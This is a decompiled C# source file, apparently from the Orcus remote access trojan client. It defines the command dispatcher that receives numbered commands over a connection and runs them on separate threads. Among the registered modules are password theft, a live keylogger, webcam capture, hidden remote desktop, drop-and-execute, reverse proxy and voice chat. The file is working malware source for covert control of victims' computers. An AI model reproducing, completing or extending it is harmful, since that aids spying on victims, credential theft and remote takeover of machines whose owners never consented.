using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using Orcus.Commands.ActiveConnections;
using Orcus.Commands.Audio;
using Orcus.Commands.AudioVolumeControl;
using Orcus.Commands.ClientCommands;
using Orcus.Commands.ClipboardManager;
using Orcus.Commands.Code;
using Orcus.Commands.ComputerInformation;
using Orcus.Commands.ConnectionInitializer;
using Orcus.Commands.Console;
using Orcus.Commands.DeviceManager;
using Orcus.Commands.DropAndExecute;
using Orcus.Commands.EventLog;
using Orcus.Commands.FileExplorer;
using Orcus.Commands.FunActions;
using Orcus.Commands.HiddenApplication;
using Orcus.Commands.LiveKeylogger;
using Orcus.Commands.LivePerformance;
using Orcus.Commands.MessageBox;
using Orcus.Commands.Passwords;
using Orcus.Commands.RegistryExplorer;
using Orcus.Commands.RemoteDesktop;
using Orcus.Commands.ReverseProxy;
using Orcus.Commands.StartupManager;
using Orcus.Commands.SystemRestore;
using Orcus.Commands.TaskManager;
using Orcus.Commands.TextChat;
using Orcus.Commands.UninstallPrograms;
using Orcus.Commands.UserInteraction;
using Orcus.Commands.VoiceChat;
using Orcus.Commands.Webcam;
using Orcus.Commands.WindowManager;
using Orcus.Commands.WindowsCustomizer;
using Orcus.Commands.WindowsDrivers;
using Orcus.Plugins;
using Orcus.Shared.Communication;
using Orcus.Utilities;

namespace Orcus.CommandManagement;

public class CommandSelector : IDisposable
{
	private readonly object _selectorLock = new object();

	private readonly Dictionary<Command, object> _lockObjects;

	private readonly Dictionary<Command, CommandSettings> _commandSettings;

	public List<Command> CommandCollection { get; }

	public Dictionary<uint, Command> CommandDictionary { get; }

	public CommandSelector()
	{
		//IL_01ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b8: Expected O, but got Unknown
		//IL_01f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fe: Expected O, but got Unknown
		CommandCollection = new List<Command>
		{
			(Command)(object)new ConsoleCommand(),
			(Command)(object)new FunActionsCommand(),
			(Command)(object)new ComputerInformation(),
			(Command)(object)new TaskmanagerCommand(),
			(Command)(object)new PasswordsCommand(),
			(Command)(object)new FileExplorerCommand(),
			(Command)(object)new RemoteDesktopCommand(),
			(Command)(object)new MessageBoxCommand(),
			(Command)(object)new AudioCommand(),
			(Command)(object)new CodeCommand(),
			(Command)(object)new RegistryCommand(),
			(Command)(object)new ActiveConnectionsCommand(),
			(Command)(object)new UninstallProgramsCommand(),
			(Command)(object)new EventLogCommand(),
			(Command)(object)new ReverseProxyCommand(),
			(Command)(object)new WebcamCommand(),
			(Command)(object)new AudioVolumeControlCommand(),
			(Command)(object)new LivePerformanceCommand(),
			(Command)(object)new TextChatCommand(),
			(Command)(object)new UserInteractionCommand(),
			(Command)(object)new LiveKeyloggerCommand(),
			(Command)(object)new HiddenApplicationCommand(),
			(Command)(object)new StartupManagerCommand(),
			(Command)(object)new WindowsCustomizerCommand(),
			(Command)(object)new SystemRestoreCommand(),
			(Command)(object)new WindowManagerCommand(),
			(Command)(object)new DeviceManagerCommand(),
			(Command)(object)new ClientCommandsCommand(),
			(Command)(object)new ConnectionInitializerCommand(),
			(Command)(object)new VoiceChatCommand(),
			(Command)(object)new WindowsDriversCommand(),
			(Command)(object)new DropAndExecuteCommand(),
			(Command)(object)new ClipboardManagerCommand()
		};
		foreach (Type command in PluginLoader.Current.Commands)
		{
			CommandCollection.Add((Command)Activator.CreateInstance(command));
		}
		foreach (IFactoryClientCommand factoryCommandPlugin in PluginLoader.Current.FactoryCommandPlugins)
		{
			FactoryCommand val = (FactoryCommand)Activator.CreateInstance(factoryCommandPlugin.get_FactoryCommandType());
			val.Initialize(factoryCommandPlugin.get_Factory());
			CommandCollection.Add((Command)(object)val);
		}
		CommandCollection = CommandCollection.Distinct(new CommandComparer()).ToList();
		PluginLoader.Current.CommandLoaded += Current_CommandLoaded;
		CommandDictionary = CommandCollection.ToDictionary((Command x) => x.get_Identifier(), (Command y) => y);
		_lockObjects = new Dictionary<Command, object>();
		_commandSettings = new Dictionary<Command, CommandSettings>();
	}

	public void Dispose()
	{
		CommandCollection.ForEach(delegate(Command x)
		{
			try
			{
				x.Dispose();
			}
			catch (Exception)
			{
			}
		});
	}

	private void Current_CommandLoaded(object sender, CommandLoadedEventArgs e)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		Command val = (Command)Activator.CreateInstance(e.NewCommandType);
		CommandCollection.Add(val);
		CommandDictionary.Add(val.get_Identifier(), val);
	}

	public void ExecuteCommand(uint id, byte[] parameter, ConnectionInfo connectionInfo)
	{
		lock (_selectorLock)
		{
			if (CommandDictionary.TryGetValue(id, out var command))
			{
				if (!GetCommandSettings(command).AllowMultipleThreads)
				{
					AutoResetEvent autoResetEventHandler = new AutoResetEvent(initialState: false);
					try
					{
						if (!_lockObjects.TryGetValue(command, out var lockObject))
						{
							_lockObjects.Add(command, lockObject = new object());
						}
						new Thread((ThreadStart)delegate
						{
							try
							{
								lock (lockObject)
								{
									autoResetEventHandler.Set();
									command.ProcessCommand(parameter, (IConnectionInfo)(object)connectionInfo);
								}
							}
							catch (Exception ex3)
							{
								ErrorReporter.Current.ReportError(ex3, $"Occurred while executing command \"{((object)command).GetType()}\" (Command ID: {id})");
								try
								{
									connectionInfo.Response(Encoding.UTF8.GetBytes(ex3.Message), (ResponseType)3, (PackageCompression)0);
								}
								catch (Exception)
								{
								}
							}
						}).Start();
						autoResetEventHandler.WaitOne();
						return;
					}
					finally
					{
						if (autoResetEventHandler != null)
						{
							((IDisposable)autoResetEventHandler).Dispose();
						}
					}
				}
				new Thread((ThreadStart)delegate
				{
					try
					{
						command.ProcessCommand(parameter, (IConnectionInfo)(object)connectionInfo);
					}
					catch (Exception ex)
					{
						ErrorReporter.Current.ReportError(ex, $"Occurred while executing command \"{((object)command).GetType()}\" (Command ID: {id})");
						try
						{
							connectionInfo.Response(Encoding.UTF8.GetBytes(ex.Message), (ResponseType)3, (PackageCompression)0);
						}
						catch (Exception)
						{
						}
					}
				}).Start();
			}
			else
			{
				connectionInfo.Response(BitConverter.GetBytes(id), (ResponseType)2, (PackageCompression)0);
			}
		}
	}

	private CommandSettings GetCommandSettings(Command command)
	{
		if (!_commandSettings.TryGetValue(command, out var value))
		{
			value = new CommandSettings();
			object[] customAttributes = ((object)command).GetType().GetCustomAttributes(inherit: true);
			value.AllowMultipleThreads = customAttributes.FirstOrDefault((object x) => x is DisallowMultipleThreadsAttribute) == null;
			_commandSettings.Add(command, value);
		}
		return value;
	}
}
